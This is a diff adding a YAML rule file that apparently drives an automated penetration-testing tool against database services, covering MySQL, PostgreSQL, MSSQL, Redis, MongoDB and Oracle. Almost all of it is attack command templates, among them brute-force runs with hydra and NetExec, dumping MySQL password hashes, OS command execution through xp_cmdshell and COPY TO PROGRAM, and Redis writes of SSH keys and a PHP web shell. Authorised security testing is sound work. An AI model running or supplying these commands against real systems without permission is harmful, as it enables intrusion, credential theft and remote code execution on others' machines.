@@ -1,0 +1,171 @@
+# ─────────────────────────────────────────────────
+# Database service rules
+# Fires when database ports are open + relevant state
+# ─────────────────────────────────────────────────
+
+# ── MySQL / MariaDB ──────────────────────────────
+
+- id: db_mysql_anon
+  name: MySQL Root No-Password
+  description: Attempt MySQL login as root with no password.
+  priority: P1
+  conditions:
+    require_ports: [3306]
+  command_template: mysql -h {IP} -u root --connect-timeout 5
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql
+
+- id: db_mysql_brute
+  name: MySQL Brute-Force
+  description: Brute-force MySQL credentials with known usernames.
+  priority: P2
+  conditions:
+    require_ports: [3306]
+    require_state: [has_valid_user]
+  command_template: "hydra -L {USERFILE} -P {PASSFILE} {IP} mysql"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql
+
+- id: db_mysql_auth
+  name: MySQL Authenticated Enumeration
+  description: Enumerate databases and extract data with valid credentials.
+  priority: P1
+  conditions:
+    require_ports: [3306]
+    require_state: [has_valid_user, has_valid_password]
+  command_template: mysql -h {IP} -u {USER} -p'{PASS}' -e 'SHOW DATABASES; SELECT user,authentication_string FROM mysql.user;'
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql
+
+- id: db_mysql_udf
+  name: MySQL UDF Privilege Escalation
+  description: Attempt command execution via MySQL UDF (requires FILE privilege).
+  priority: P1
+  conditions:
+    require_ports: [3306]
+    require_state: [has_valid_user, has_valid_password]
+  command_template: "# Check with: SELECT @@plugin_dir; SELECT file_priv FROM mysql.user WHERE user='{USER}';"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation
+
+# ── PostgreSQL ───────────────────────────────────
+
+- id: db_postgres_default
+  name: PostgreSQL Default Login
+  description: Attempt PostgreSQL login with default postgres/postgres credentials.
+  priority: P1
+  conditions:
+    require_ports: [5432]
+  command_template: psql -h {IP} -U postgres -c '\\l'
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
+
+- id: db_postgres_auth
+  name: PostgreSQL Authenticated Enumeration
+  description: List databases and roles with valid credentials.
+  priority: P1
+  conditions:
+    require_ports: [5432]
+    require_state: [has_valid_user, has_valid_password]
+  command_template: psql -h {IP} -U {USER} -c 'SELECT datname FROM pg_database; SELECT usename,usesuper FROM pg_user;'
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
+
+- id: db_postgres_rce
+  name: PostgreSQL Command Execution
+  description: Attempt OS command execution via COPY TO PROGRAM (requires superuser).
+  priority: P1
+  conditions:
+    require_ports: [5432]
+    require_state: [has_valid_user, has_valid_password]
+  command_template: psql -h {IP} -U {USER} -c "COPY (SELECT '') TO PROGRAM 'id';"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce
+
+# ── MSSQL ────────────────────────────────────────
+
+- id: db_mssql_brute
+  name: MSSQL Brute-Force
+  description: Brute-force MSSQL credentials using NetExec.
+  priority: P2
+  conditions:
+    require_ports: [1433]
+    require_state: [has_valid_user]
+  command_template: nxc mssql {IP} -u {USERFILE} -p {PASSFILE} --continue-on-success
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql
+
+- id: db_mssql_auth
+  name: MSSQL Authenticated Login
+  description: Connect to MSSQL with discovered credentials.
+  priority: P1
+  conditions:
+    require_ports: [1433]
+    require_state: [has_valid_user, has_valid_password]
+  command_template: impacket-mssqlclient {USER}:'{PASS}'@{IP} -windows-auth
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql
+
+- id: db_mssql_xpcmdshell
+  name: MSSQL xp_cmdshell RCE
+  description: Enable and use xp_cmdshell for OS command execution.
+  priority: P1
+  conditions:
+    require_ports: [1433]
+    require_state: [has_valid_user, has_valid_password]
+  command_template: "impacket-mssqlclient {USER}:'{PASS}'@{IP} -windows-auth -q \"EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';\""
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql#execute-os-commands
+
+- id: db_mssql_linked_servers
+  name: MSSQL Linked Server Enumeration
+  description: Enumerate linked servers for lateral movement via MSSQL.
+  priority: P2
+  conditions:
+    require_ports: [1433]
+    require_state: [has_valid_user, has_valid_password]
+  command_template: "impacket-mssqlclient {USER}:'{PASS}'@{IP} -windows-auth -q 'EXEC sp_linkedservers;'"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql#linked-servers
+
+# ── Redis ────────────────────────────────────────
+
+- id: db_redis_unauth
+  name: Redis Unauthenticated Access
+  description: Test for unauthenticated Redis access and dump keys.
+  priority: P1
+  conditions:
+    require_ports: [6379]
+  command_template: redis-cli -h {IP} INFO
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
+
+- id: db_redis_rce_ssh
+  name: Redis SSH Key Write
+  description: Write an SSH public key to authorized_keys via Redis for RCE.
+  priority: P1
+  conditions:
+    require_ports: [6379]
+    jmespath: "length(ports[?port==`22`]) > `0`"
+  command_template: "# redis-cli -h {IP} CONFIG SET dir /root/.ssh && SET authorized_keys 'ssh-rsa ...'"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce
+
+- id: db_redis_rce_webshell
+  name: Redis Webshell Write
+  description: Write a webshell to a web root via Redis for RCE.
+  priority: P1
+  conditions:
+    require_ports: [6379]
+    jmespath: "length(ports[?port==`80` || port==`443`]) > `0`"
+  command_template: "# redis-cli -h {IP} CONFIG SET dir /var/www/html && SET shell '<?php system($_GET[\"cmd\"]); ?>'"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce
+
+# ── MongoDB ──────────────────────────────────────
+
+- id: db_mongodb_unauth
+  name: MongoDB Unauthenticated Access
+  description: Test for unauthenticated MongoDB access and list databases.
+  priority: P1
+  conditions:
+    require_ports: [27017]
+  command_template: mongosh --host {IP} --eval 'db.adminCommand({listDatabases:1})'
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb
+
+# ── Oracle ───────────────────────────────────────
+
+- id: db_oracle_scan
+  name: Oracle Full Audit
+  description: Run ODAT all-modules scan against Oracle DB.
+  priority: P1
+  conditions:
+    require_ports: [1521]
+  command_template: odat all -s {IP}
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener
